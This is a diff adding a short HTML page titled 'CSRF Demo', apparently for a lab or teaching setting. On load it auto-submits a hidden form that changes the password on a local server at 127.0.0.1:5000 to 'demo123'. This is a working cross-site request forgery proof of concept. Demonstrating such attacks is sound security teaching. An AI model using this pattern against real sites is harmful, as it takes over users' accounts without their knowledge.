@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Demo</title>
+</head>
+<body>
+    <h1>This is a CSRF Demonstration Page</h1>
+
+    <form action="http://127.0.0.1:5000/change-password" method="POST" id="csrf-form">
+        <input type="hidden" name="new_password" value="demo123">
+        <input type="hidden" name="confirm_password" value="demo123">
+    </form>
+
+    <script>
+        window.onload = function () {
+            document.getElementById('csrf-form').submit();
+        };
+    </script>
+</body>
+</html>
